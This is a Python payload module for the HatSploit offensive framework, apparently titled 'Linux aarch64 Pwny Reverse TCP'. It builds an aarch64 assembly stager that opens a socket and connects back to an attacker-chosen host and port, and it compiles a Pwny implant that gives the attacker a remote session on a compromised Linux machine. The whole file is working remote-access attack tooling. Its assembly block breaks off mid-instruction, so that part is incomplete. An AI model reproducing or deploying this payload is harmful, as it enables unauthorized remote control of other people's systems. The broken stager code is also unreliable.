
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny import Pwny
from pwny.session import PwnySession

from pex.assembler import Assembler
from pex.exe.elf import ELF

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler, Assembler, ELF):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux aarch64 Pwny Reverse TCP",
            'Payload': "linux/aarch64/pwny_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Pwny reverse TCP payload for Linux aarch64.",
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Rank': "high",
            'Type': "reverse_tcp",
        })

    def phase(self):
        entry = self.elf_header(self.implant())['e_entry']

        return self.assemble(
            self.details['Arch'],
            f"""
            bl connect

            addr:
                .short 0x2
                .short 0x{self.rport.little.hex()}
                .word 0x{self.rhost.little.hex()}

            connect:
                mov x0, 0x2
                mov x1, 0x1
                mov x2, 0
                mov x8, 0xc6
                svc 0
                mov x12, x0

                adr x1, addr
                mov x2, 0x10
                mov x8, 0xcb
                svc 0

            load:
                adr x2, 
            """
        )

    def implant(self):
        return Pwny(
            target='aarch64-linux-musl',
        ).to_binary('bin')

    def run(self):
        return Pwny(
            target='aarch64-linux-musl',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
